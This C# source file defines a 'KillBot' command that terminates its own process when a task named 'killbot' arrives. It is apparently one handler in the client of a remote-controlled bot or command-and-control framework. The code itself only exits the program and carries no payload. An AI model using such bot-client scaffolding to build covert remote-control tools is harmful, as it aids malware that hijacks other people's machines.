using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using System;

namespace pattaya_project_client.Commands.Implements
{
    public class KillBot : BotCommand
    {
        public override string TaskName => "killbot";

        public override string RunTask(BotTask task)
        {
            Environment.Exit(0);
            return "Bot has been killed";
        }
    }
}
